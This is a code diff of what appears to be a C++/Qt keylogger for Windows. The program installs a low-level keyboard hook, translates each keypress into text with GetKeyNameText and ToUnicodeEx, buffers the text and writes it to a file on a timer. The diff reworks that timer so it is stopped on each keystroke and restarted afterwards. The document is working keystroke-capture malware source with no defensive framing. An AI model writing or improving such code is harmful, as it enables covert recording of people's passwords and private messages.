@@ -3,6 +3,7 @@
 static HHOOK hHook = nullptr;
 static QByteArray outputBuffer;
 static QFile output;
+static QTimer *timer;
 
 Core::Core(QObject *parent) :
     QObject(parent)
@@ -39,9 +40,10 @@ Core::Core(QObject *parent) :
         QFile::rename(currentFilePath, newFilePath);
     }
 
-    QTimer *timer = new QTimer();
+    timer = new QTimer(this);
     QObject::connect(timer, &QTimer::timeout, Core::writeOutput);
-    timer->start(9000);
+    timer->setInterval(INTERVAL);
+    timer->start();
 }
 
 Core::~Core()
@@ -60,6 +62,8 @@ void Core::update(BYTE *keyState, int keyCode)
 LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (wParam == WM_KEYDOWN) {
+        timer->stop();
+
         KBDLLHOOKSTRUCT key = *((KBDLLHOOKSTRUCT *) lParam);
 
         wchar_t buffer[6];
@@ -78,7 +82,8 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
         dWordMessage += key.flags << 24;
 
         int i = GetKeyNameText(dWordMessage, (LPTSTR) lpszName, 255);
-        int result = ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);
+        ToUnicodeEx(key.vkCode, key.scanCode, keyboardState, buffer, 5, 0, keyboardLayout);
+
         buffer[5] = L'\0';
 
         QString toBeAppended;
@@ -97,6 +102,7 @@ LRESULT CALLBACK Core::process(int nCode, WPARAM wParam, LPARAM lParam)
         }
 
         outputBuffer.append(toBeAppended);
+        timer->start();
     }
 
     return CallNextHookEx(hHook, nCode, wParam, lParam);
